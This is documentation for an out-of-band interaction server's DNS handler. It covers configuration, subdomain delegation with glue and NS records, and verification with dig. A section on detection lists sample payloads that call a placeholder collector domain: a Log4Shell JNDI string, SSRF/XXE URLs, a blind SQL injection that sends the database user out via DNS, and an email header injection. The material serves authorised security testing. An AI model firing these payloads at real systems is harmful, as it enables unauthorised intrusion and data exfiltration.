---
title: DNS Delegation
description: Set up the DNS handler and delegate a subdomain for out-of-band detection
weight: 50
---

The DNS handler listens for UDP queries and responds to every request with
a configurable A record. Every query is logged as an interaction event and
delivered to notifiers. This makes it ideal for detecting out-of-band DNS
lookups triggered by SSRF, XXE, log4shell, and similar vulnerabilities.

## How it works

The handler responds to **all queries for all domains** — there is no
zone configuration. Every query (regardless of type — A, AAAA, MX, etc.)
receives the same A record response with a TTL of 0 (not cacheable).

To make this useful, you **delegate a subdomain** to xodbox so that DNS
resolution for `*.oob.yourdomain.com` reaches your server.

## Prerequisites

- A domain whose DNS you control (via your registrar or DNS provider).
- A server with a **static public IP** that can bind port 53/UDP.
- `CAP_NET_BIND_SERVICE` capability (or root) to bind port 53.

## Configuration

```yaml
handlers:
  - handler: DNS
    listener: :53
    default_ip: 203.0.113.10
```

| Key | Required | Default | Notes |
|-----|----------|---------|-------|
| `handler` | yes | — | Must be `DNS`. |
| `listener` | yes | — | UDP bind address, e.g. `:53` or `0.0.0.0:5353`. Port 53 requires `CAP_NET_BIND_SERVICE`. |
| `default_ip` | yes | — | IPv4 address returned as the A record for every query. Invalid values produce empty responses. |

## Setting up DNS delegation

### Step 1: Create glue records

At your DNS registrar or provider, create an **A record** pointing to
your xodbox server's public IP. This becomes the "glue" that tells
resolvers where to find your nameserver:

```
ns-oob.example.com.  A  203.0.113.10
```

### Step 2: Delegate the subdomain

Create an **NS record** that delegates a subdomain to the host you just
created:

```
oob.example.com.  NS  ns-oob.example.com.
```

This tells the DNS hierarchy that all queries for `*.oob.example.com`
should be sent to `ns-oob.example.com` (your xodbox server).

### Step 3: Configure and start xodbox

Set `default_ip` to the IP you want every query to resolve to — typically
your xodbox server's own public IP:

```yaml
handlers:
  - handler: DNS
    listener: :53
    default_ip: 203.0.113.10
```

### Step 4: Verify

From another machine, query a random subdomain:

```sh
dig test123.oob.example.com @203.0.113.10
```

You should see an A record pointing to `203.0.113.10` and an interaction
logged in xodbox.

To verify delegation through the public DNS hierarchy (not direct):

```sh
dig test456.oob.example.com
```

If delegation is correct, this resolves through the public DNS hierarchy
to your xodbox server.

## Using DNS for out-of-band detection

Once delegation is set up, embed a unique subdomain in your payloads. If
the target application performs a DNS lookup, xodbox captures it:

**SSRF / XXE:**
```
https://unique-token.oob.example.com/
```

**Log4Shell:**
```
${jndi:ldap://unique-token.oob.example.com/a}
```

**Blind SQL injection (DNS exfiltration):**
```sql
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT user()), '.oob.example.com\\a'));
```

**Email header injection:**
```
From: test@unique-token.oob.example.com
```

Use [sinks](/docs/guides/admin-console) to group and label interactions by
engagement or test case.

## Combining with the HTTPX handler

A typical deployment runs both DNS and HTTPX handlers together. DNS
captures the lookup; HTTPX captures the follow-up HTTP request:

```yaml
handlers:
  - handler: DNS
    listener: :53
    default_ip: 203.0.113.10

  - handler: HTTPX
    listener: :80
    admin_listener: 127.0.0.1:9091
```

Set `default_ip` to the same server so that DNS resolution leads the
target to make an HTTP request to xodbox as well.

## Notifier filter examples

The DNS handler's filter string has the format:

```
DNS <QTYPE> <qname> from <ip>
```

| Goal | Filter |
|------|--------|
| All DNS events | `^DNS` |
| Only A queries | `^DNS A ` |
| Queries for a specific domain | `^DNS .* .*\.oob\.example\.com` |
| Queries from a specific IP | `^DNS .* from 10\.0\.0\.5` |

## Operational notes

- **TTL is always 0.** Responses are not cacheable. This ensures every
  lookup reaches xodbox, but may increase query volume from recursive
  resolvers.
- **All query types return an A record.** AAAA, MX, and other query types
  still get an A response. There is no type-specific response logic.
- **Port 53 requires privileges.** On Linux, grant `CAP_NET_BIND_SERVICE`
  to the xodbox binary (`setcap cap_net_bind_service=+ep ./xodbox`) or
  run as root. In Docker, publish the port with `-p 53:53/udp`.
- **Stop existing resolvers.** `systemd-resolved` or `dnsmasq` may
  already bind port 53. Disable or reconfigure them before starting
  xodbox's DNS handler.
